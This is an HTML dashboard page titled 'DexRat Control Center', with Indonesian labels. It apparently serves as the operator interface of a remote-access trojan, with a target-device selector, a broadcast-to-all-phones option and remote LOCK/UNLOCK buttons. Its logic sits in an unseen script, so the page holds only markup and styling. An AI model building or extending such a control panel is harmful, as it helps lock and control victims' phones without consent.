<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DexRat Control Center</title>
    <style>
        :root { --bg: #0f172a; --card: #1e293b; --primary: #3b82f6; --danger: #ef4444; --success: #22c55e; }
        body { font-family: 'Segoe UI', system-ui, sans-serif; background: var(--bg); color: #f8fafc; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
        .container { width: 100%; max-width: 600px; background: var(--card); border-radius: 16px; padding: 24px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
        h1 { margin: 0 0 20px 0; font-size: 24px; text-align: center; color: var(--primary); letter-spacing: 1px; }
        .device-selector { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; font-size: 14px; color: #94a3b8; }
        select { width: 100%; padding: 12px; background: #334155; border: 1px solid #475569; border-radius: 8px; color: white; font-size: 16px; outline: none; }
        .device-stats { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px; }
        .stat-box { background: #334155; padding: 12px; border-radius: 8px; text-align: center; }
        .stat-label { font-size: 12px; color: #94a3b8; display: block; }
        .stat-value { font-weight: bold; font-size: 14px; }
        .btn-group { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
        button { padding: 14px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.2s; font-size: 14px; text-transform: uppercase; }
        .btn-lock { background: var(--danger); color: white; }
        .btn-lock:hover { background: #dc2626; opacity: 0.9; }
        .btn-unlock { background: var(--success); color: white; }
        .btn-unlock:hover { background: #16a34a; opacity: 0.9; }
        #log { margin-top: 20px; font-size: 12px; background: #000; padding: 10px; border-radius: 6px; height: 100px; overflow-y: auto; font-family: monospace; color: #22c55e; }
        .online-dot { height: 8px; width: 8px; background-color: var(--success); border-radius: 50%; display: inline-block; margin-right: 5px; }
        .offline-dot { height: 8px; width: 8px; background-color: var(--danger); border-radius: 50%; display: inline-block; margin-right: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>DEXRAT DASHBOARD</h1>

        <div class="device-selector">
            <label>Pilih Target Device</label>
            <select id="deviceSelect">
                <option value="all">BROADCAST (SEMUA HP)</option>
            </select>
        </div>

        <div class="device-stats" id="statsContainer" style="display:none;">
            <div class="stat-box">
                <span class="stat-label">Model</span>
                <span class="stat-value" id="statModel">-</span>
            </div>
            <div class="stat-box">
                <span class="stat-label">Status</span>
                <span class="stat-value" id="statStatus">-</span>
            </div>
        </div>

        <div class="btn-group">
            <button class="btn-lock" id="btnLock">LOCK DEVICE</button>
            <button class="btn-unlock" id="btnUnlock">UNLOCK DEVICE</button>
        </div>

        <div id="log">Dashboard Ready...</div>
    </div>

    <script type="module" src="/main.js"></script>
</body>
</html>
